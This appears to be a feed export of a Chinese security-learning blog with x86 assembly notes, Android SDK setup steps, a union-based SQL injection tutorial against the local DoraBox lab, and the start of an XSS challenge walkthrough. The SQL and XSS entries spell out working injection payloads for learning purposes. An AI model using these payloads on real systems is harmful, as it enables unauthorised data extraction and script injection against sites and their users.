PTR DS:[EDX+0xC].0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX+4]MOV EAX,DWORD PTR DS:[EDX+4]</code></p><h4 id="寻址公式四：-reg-reg-（1-or-2-or-4-or-8）"><a href="#寻址公式四：-reg-reg-（1-or-2-or-4-or-8）" class="headerlink" title="寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]"></a>寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4]</code></p><h4 id="寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数"><a href="#寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数" class="headerlink" title="寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]"></a>寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4+4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4+2]</code></p><h3 id="二、堆栈"><a href="#二、堆栈" class="headerlink" title="二、堆栈"></a>二、堆栈</h3><h4 id="变形的艺术"><a href="#变形的艺术" class="headerlink" title="变形的艺术:"></a>变形的艺术:</h4><h5 id="push-eax代码相当于"><a href="#push-eax代码相当于" class="headerlink" title="push eax代码相当于:"></a>push eax代码相当于:</h5><p><code>lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],eax或者mov dword ptr ss:[esp-4],eaxlea esp,dword ptr ss:[esp-4]还有sub esp,0x4mov dword ptr ss:[esp],eax</code></p><h5 id="push-esp代码相当于："><a href="#push-esp代码相当于：" class="headerlink" title="push esp代码相当于："></a>push esp代码相当于：</h5><p><code>mov dword ptr [esp-4],esp sub esp,0x4</code><br> 还有：</p><p> <code>mov dword ptr [esp-4],esp  lea esp,dword ptr [esp-4]</code></p><h5 id="pop-eax-代码相当于："><a href="#pop-eax-代码相当于：" class="headerlink" title="pop eax 代码相当于："></a>pop eax 代码相当于：</h5><p><code>lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4]</code></p><p><code>mov eax,dword ptr [esp] lea esp,dword ptr [esp+4]</code></p><h5 id="pop-esp-代码相当于："><a href="#pop-esp-代码相当于：" class="headerlink" title="pop esp 代码相当于："></a>pop esp 代码相当于：</h5><p><code>add esp,0x4 mov esp,dword ptr[esp-4]</code><br>或者</p><p><code>lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4]</code></p><h4 id="两条简单指令"><a href="#两条简单指令" class="headerlink" title="两条简单指令"></a>两条简单指令</h4><p>stos ：将eax中的值放入edi所指地址的内存里。</p><p>rep ：是重复指令 ecx中放入重复的次数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向学习-滴水公开课知识总结&quot;&gt;&lt;a href=&quot;#逆向学习-滴水公开课知识总结&quot; class=&quot;headerlink&quot; title=&quot;逆向学习-滴水公开课知识总结&quot;&gt;&lt;/a&gt;逆向学习-滴水公开课知识总结&lt;/h1&gt;&lt;h3 id=&quot;一、内存的读写&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>安卓程序分析环境搭建</title>
    <link href="https://chumen77.github.io/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://chumen77.github.io/2019/09/23/安卓程序分析环境搭建/</id>
    <published>2019-09-23T09:22:24.000Z</published>
    <updated>2019-10-17T15:45:31.000Z</updated>
    
    <content type="html"><![CDATA[<p>#安卓程序分析环境搭建</p><h2 id="Mac下安卓SDK搭建："><a href="#Mac下安卓SDK搭建：" class="headerlink" title="Mac下安卓SDK搭建："></a>Mac下安卓SDK搭建：</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载SDK"><a href="#1：下载SDK" class="headerlink" title="1：下载SDK"></a>1：下载SDK</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew search android-sdk</span><br><span class="line">brew cask install android-sdk</span><br></pre></td></tr></table></figure><h3 id="2：配置环境变量"><a href="#2：配置环境变量" class="headerlink" title="2：配置环境变量"></a>2：配置环境变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .zshrc</span><br><span class="line">export ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;</span><br><span class="line">export PATH=&quot;$&#123;PATH&#125;:$&#123;ANDROID_SDK_ROOT&#125;/tools:$&#123;ANDROID_SDK_ROOT&#125;/platform-tools&quot;</span><br></pre></td></tr></table></figure><p><code>!wq</code>退出以后，<code>source ~/.zshrc</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">/usr/local/share/android-sdk/tools/bin</span><br><span class="line">./sdkmanager</span><br></pre></td></tr></table></figure><p>然后会出现<code>Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.</code><br>继续<code>touch /Users/gjy/.android/repositories.cfg</code></p><h3 id="3：检验是否搭建好"><a href="#3：检验是否搭建好" class="headerlink" title="3：检验是否搭建好"></a>3：检验是否搭建好</h3><p>在终端输入：<code>android</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/23/安卓程序分析环境搭建/images/15692314399452.jpg" alt="-w706" title>                </div>                <div class="image-caption">-w706</div>            </figure><p>这就ok了。</p><h2 id="安卓NDK搭建"><a href="#安卓NDK搭建" class="headerlink" title="安卓NDK搭建"></a>安卓NDK搭建</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载NDK："><a href="#1：下载NDK：" class="headerlink" title="1：下载NDK："></a>1：下载NDK：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew search android-ndk</span><br><span class="line">brew cask install android-ndk</span><br></pre></td></tr></table></figure><h3 id="2：配置环境变量："><a href="#2：配置环境变量：" class="headerlink" title="2：配置环境变量："></a>2：配置环境变量：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .zshrc</span><br><span class="line">export ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot;  //添加进去正常保存退出</span><br><span class="line">source .zshrc</span><br></pre></td></tr></table></figure><h3 id="3：检验："><a href="#3：检验：" class="headerlink" title="3：检验："></a>3：检验：</h3><p><code>ndk-build</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/23/安卓程序分析环境搭建/images/15692340400478.jpg" alt="-w751" title>                </div>                <div class="image-caption">-w751</div>            </figure><p>已经成功了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#安卓程序分析环境搭建&lt;/p&gt;
&lt;h2 id=&quot;Mac下安卓SDK搭建：&quot;&gt;&lt;a href=&quot;#Mac下安卓SDK搭建：&quot; class=&quot;headerlink&quot; title=&quot;Mac下安卓SDK搭建：&quot;&gt;&lt;/a&gt;Mac下安卓SDK搭建：&lt;/h2&gt;&lt;p&gt;前提是已经安装了&lt;st
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL注入基础学习</title>
    <link href="https://chumen77.github.io/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>https://chumen77.github.io/2019/09/01/SQL基础学习/</id>
    <published>2019-09-01T11:17:25.000Z</published>
    <updated>2019-10-24T07:58:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础学习"><a href="#SQL注入基础学习" class="headerlink" title="SQL注入基础学习"></a>SQL注入基础学习</h1><h2 id="数据类型（数字型）"><a href="#数据类型（数字型）" class="headerlink" title="数据类型（数字型）"></a>数据类型（数字型）</h2><h3 id="检测是否sql语句是否执行"><a href="#检测是否sql语句是否执行" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><h4 id="使用and-or-xor-like测试"><a href="#使用and-or-xor-like测试" class="headerlink" title="使用and,or,xor,like测试"></a>使用<code>and,or,xor,like</code>测试</h4><ul><li>** 1=1</li><li>** 1=2<br>其中<code>**</code>可以为<code>and or xor like</code>任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。</li></ul><h4 id="使用符号测试"><a href="#使用符号测试" class="headerlink" title="使用符号测试"></a>使用符号测试</h4><ul><li>单引号</li><li>减号</li></ul><h2 id="数据类型（字符型）"><a href="#数据类型（字符型）" class="headerlink" title="数据类型（字符型）"></a>数据类型（字符型）</h2><h3 id="检测是否sql语句是否执行-1"><a href="#检测是否sql语句是否执行-1" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><p>此处跟数字型测试办法基本一样，还是使用<code>and,or,xor,like</code>、<code>单引号</code>测试。最近接触字符型的注入较少，补充一下原理：</p><p>我们先进行正常查询：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>当我们给接受处加<code>&#39;</code>：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>语句执行后，会产生报错：<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673389579474.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br>然后我们想办法不让其报错，就是来省略后面那个php代码语句加的<code>&#39;</code>:</p><ol><li>用<code>#</code>来注释，但需要进行url来转变一下为<code>%23</code></li><li>用<code>--+</code> <code>--%20</code>来注释<br>然后就可以来用<code>and or xor like</code>来测试了，例如：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673394738908.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673394874987.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ol><h3 id="union知识小记"><a href="#union知识小记" class="headerlink" title="union知识小记"></a>union知识小记</h3><p>union在集合两个select查询语句时，一定要注意<strong>两个查询出来的结果,列数（columns）要相等才会出来结果。</strong><br>例如：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673411551995.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p><code>SELECT * from news union SELECT 1,2;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673412010749.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>报错，换成<code>SELECT * from news union SELECT 1,2,3;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673412472041.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="order-by-知识小记"><a href="#order-by-知识小记" class="headerlink" title="order by 知识小记"></a>order by 知识小记</h3><p><code>order by</code>是按照一定规则来进行排序的语句。我们为什么能够通过<code>order by</code>排序，来排出来列名有多少个呢？我们来测试一下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673428181899.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p><code>SELECT * from test ORDER BY 1;</code><br>当我们在测试到<code>SELECT * from test ORDER BY 5;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673428766361.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现出了异常。<br>我们换个3列的表：<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673429298587.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br><code>SELECT * from newsORDER BY 3;</code>显示是正常的<br><code>SELECT * from newsORDER BY 4;</code><img src="/2019/09/01/SQL基础学习/images/15673429733420.jpg" alt><br>所以可以<strong>发现我们在<code>order by</code>后加数字可以来测出来一个表的列名个数。</strong></p><h3 id="显示联合查询出现的结果"><a href="#显示联合查询出现的结果" class="headerlink" title="显示联合查询出现的结果"></a>显示联合查询出现的结果</h3><p>显示我们自定义查询的结果，该怎么实现呢。<br>先在靶场测试：<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQL基础学习/images/15673503130693.jpg" alt></p><p>明显网页是不给显示的。相同语句在数据库：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673494870032.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQL基础学习/images/15673498250797.jpg" alt="-w430"><br>发现是不显示东西的。继续测试:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673498938620.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>接着我们拿到靶场测试：<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673503981645.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure></p><p>达到我们的目的了。看这个页面显示的效果<code>2 3</code>，反向思维考虑把<code>2 3</code>改成我们的列名是不是就可以出数据了，<strong>但是我们如何知道表里的列名呢？</strong></p><h3 id="exists（）函数小记"><a href="#exists（）函数小记" class="headerlink" title="exists（）函数小记"></a>exists（）函数小记</h3><p><code>exists()</code>是验证某个语句是否存在结果，是个bool函数，存在显示<code>1</code>反之是<code>0</code>。<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>在数据库进行测试:<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673529496971.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673532051506.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现在用这个函数查<strong>不存在的表</strong>的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，<strong>可以通过burpsuit来跑</strong>。还有意外收获，可以看出数据库的名字<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15673536538274.jpg" alt title>                </div>                <div class="image-caption"></div>            </figure><br>pentest就是数据库的名字了。</p><h2 id="数据类型（搜索型）"><a href="#数据类型（搜索型）" class="headerlink" title="数据类型（搜索型）"></a>数据类型（搜索型）</h2><h3 id="的作用"><a href="#的作用" class="headerlink" title="%的作用"></a><code>%</code>的作用</h3><p><code>%</code>在mysql中表示通配符。在SQL语句中:<br><code>******* like &#39;%a&#39;</code>，就是搜索返回以字母<code>a</code>结尾的所有信息，同理<code>a%``%a%</code>,分别就是 搜索返回以字母<code>a</code>开头的所有信息和搜索返回包含字母<code>a</code>的所有信息。</p><h3 id="如何注入"><a href="#如何注入" class="headerlink" title="如何注入"></a>如何注入</h3><p>咱们先看下php源代码:<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>很明显提前闭合<code>&#39;%</code>跟省略后面的<code>%&#39;</code>就可以了，所以<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679129656049.jpg" alt="-w804" title>                </div>                <div class="image-caption">-w804</div>            </figure><p>然后我们正常走步骤，利用<code>order by</code>来确定下多少列：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679138962766.jpg" alt="-w840"><br>继续<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679139214321.jpg" alt="-w1022" title>                </div>                <div class="image-caption">-w1022</div>            </figure><p>可以确定是3列了。</p><p>然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：<br>先正常构造payload：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679141526795.jpg" alt="-w843" title>                </div>                <div class="image-caption">-w843</div>            </figure><p>确定news表名存在，然后开始用burp跑其他的：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679142504637.jpg" alt="-w555" title>                </div>                <div class="image-caption">-w555</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679143681990.jpg" alt="-w837" title>                </div>                <div class="image-caption">-w837</div>            </figure><p>我们是跑表名，所以在<code>news</code>加上变量。这个步骤需要先点<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679145034217.jpg" alt="-w371" title>                </div>                <div class="image-caption">-w371</div>            </figure><br>然后</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679144276086.jpg" alt="-w364" title>                </div>                <div class="image-caption">-w364</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679145997135.jpg" alt="-w531" title>                </div>                <div class="image-caption">-w531</div>            </figure><p>在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679146928775.jpg" alt="-w1260" title>                </div>                <div class="image-caption">-w1260</div>            </figure></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679147050548.jpg" alt="-w778" title>                </div>                <div class="image-caption">-w778</div>            </figure><p>然后我们开始看结果<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679147687971.jpg" alt="-w666" title>                </div>                <div class="image-caption">-w666</div>            </figure><br><code>Render</code>下面显示正常就证明是存在的。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679148321357.jpg" alt="-w963" title>                </div>                <div class="image-caption">-w963</div>            </figure><p>这个是不存在。最终用这个办法可以跑出表名<code>test、account</code>。同样办法跑列名：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679152029822.jpg" alt="-w665" title>                </div>                <div class="image-caption">-w665</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679151626020.jpg" alt="-w797" title>                </div>                <div class="image-caption">-w797</div>            </figure><p>确定出<code>news</code>表中有<code>id、title、content</code>等列。</p><p>然后我们更新下语句来查表和列，<code>exists()</code>这个办法是有点老的比较笨。<strong>在MySQL&gt;5.1版本中</strong>，<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679322405278.jpg" alt="-w764" title>                </div>                <div class="image-caption">-w764</div>            </figure><br>我们可以在<code>information_schema</code>发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：<br>第一步，我们先让其可以显示我们想查询的内容<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679326036385.jpg" alt="-w904"><br>把标题下的<code>2</code>换成<code>darabase()</code>函数，来显示下数据库的名字。<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679327628086.jpg" alt="-w982" title>                </div>                <div class="image-caption">-w982</div>            </figure><p>然后我们就的得到了<code>pentest</code>，然后开始利用这个mysql&gt;5.1特性来构造语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679330638311.jpg" alt="-w902" title>                </div>                <div class="image-caption">-w902</div>            </figure><p>但是在这里面怎么显示其他的名字呢？<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679331040602.jpg" alt="-w523" title>                </div>                <div class="image-caption">-w523</div>            </figure><br>继续:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit</code>其中可以将<code>!=</code>换成<code>&lt;&gt;</code>是同样的效果。<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679332502596.jpg" alt="-w916" title>                </div>                <div class="image-caption">-w916</div>            </figure><br>继续在语句中加<code>and和不等于前面查出的表的名字</code>：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679333657212.jpg" alt="-w989"><br><strong>我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了<code>group_cancat()</code>函数：</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679337786295.jpg" alt="-w1028"></p><p>然后我们继续去查列名，然后转到<code>infromation_schema</code>的<code>columns</code>下，一直搜索<code>account</code>下滑发现，我们在这个列表下可以拿到更全的信息：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679344981875.jpg" alt="-w1162" title>                </div>                <div class="image-caption">-w1162</div>            </figure><p>去对比下<code>account</code>表下的列名信息：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679342199859.jpg" alt="-w189" title>                </div>                <div class="image-caption">-w189</div>            </figure><p>是相对应的，所以我们可以更改下语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679346900575.jpg" alt="-w1012" title>                </div>                <div class="image-caption">-w1012</div>            </figure><p>发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿<code>news</code>测试下获取列名：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/2019/09/01/SQL基础学习/images/15679349902804.jpg" alt="-w1049" title>                </div>                <div class="image-caption">-w1049</div>            </figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL注入基础学习&quot;&gt;&lt;a href=&quot;#SQL注入基础学习&quot; class=&quot;headerlink&quot; title=&quot;SQL注入基础学习&quot;&gt;&lt;/a&gt;SQL注入基础学习&lt;/h1&gt;&lt;h2 id=&quot;数据类型（数字型）&quot;&gt;&lt;a href=&quot;#数据类型（数字型）&quot; class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS挑战之旅</title>
    <link href="https://chumen77.github.io/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <id>https://chumen77.github.io/2019/08/20/XSS挑战之旅/</id>
    <published>2019-08-20T12:29:45.000Z</published>
    <updated>2019-10-17T15:42:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS挑战之旅"><a href="#XSS挑战之旅" class="headerlink" title="XSS挑战之旅"></a>XSS挑战之旅</h1><h2 id="关卡"><a href="#关卡" class="headerlink" title="关卡"></a>关卡</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668211760590.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>此题没有任何过滤，直接构造语句，在标签之间进行输出。</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668215829302.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>此题变成了<code>&lt;input&gt;</code>标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221905952.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>或者也可以payload：<code>&quot; onclick=alert(1)&gt;</code>这个需要点击搜索后，再点击搜索框，属于借助js事件类型。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221627239.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668225398647.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>变成了单引号的input标签，先尝试闭合input标签这个思路。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227235348.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现没有过去，去看下网页代码。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227746468.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            </figure><p>发现其过滤了<code>&lt; &gt;</code>,这样只能通过js事件来构造弹窗。<br>跟上题一样，不过此处是单引号，所以构造payload：<br><code>&#39; onclick=&#39;alert(1)</code><br>注意此处的<code>alert(1)</code>的前面还有个单引号，其效果就是<code>value=&#39;&#39; onclick=&#39;alert(1)&#39;</code></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668232441274.jpg?raw=true" alt title>                </div>                <div class="image-caption"></div>            